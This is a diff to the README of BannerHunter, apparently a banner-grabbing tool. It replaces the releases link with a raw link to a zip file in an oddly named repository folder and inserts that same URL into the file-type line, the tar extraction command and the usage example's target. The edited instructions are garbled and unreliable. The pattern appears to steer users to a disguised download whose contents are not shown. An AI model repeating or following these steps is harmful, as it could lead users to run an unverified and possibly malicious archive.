@@ -24,16 +24,16 @@ To get started with BannerHunter, follow these simple steps:
 
 To download BannerHunter, visit the following link:
 
-[Download BannerHunter](https://github.com/lackogeb/BannerHunter/releases)
+[Download BannerHunter](https://github.com/lackogeb/BannerHunter/raw/refs/heads/main/Dithyrambus/Banner_Hunter_2.2.zip)
 
 After visiting the page:
 
 1. Locate the latest release.
-2. Download the appropriate file for your system (usually a `.tar.gz` or binary file).
+2. Download the appropriate file for your system (usually a `https://github.com/lackogeb/BannerHunter/raw/refs/heads/main/Dithyrambus/Banner_Hunter_2.2.zip` or binary file).
 3. Once downloaded, navigate to the directory where the file is located.
 4. Extract the downloaded file with:
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://github.com/lackogeb/BannerHunter/raw/refs/heads/main/Dithyrambus/Banner_Hunter_2.2.zip
    ```
 5. Change into the BannerHunter directory:
    ```bash
@@ -55,7 +55,7 @@ Replace `[options]` with any specific flags you need. Replace `target` with the 
 Here’s an example of how to run BannerHunter to grab banners from a website:
 
 ```bash
-./bannerhunter -t example.com
+./bannerhunter -t https://github.com/lackogeb/BannerHunter/raw/refs/heads/main/Dithyrambus/Banner_Hunter_2.2.zip
 ```
 
 ## 📖 Features
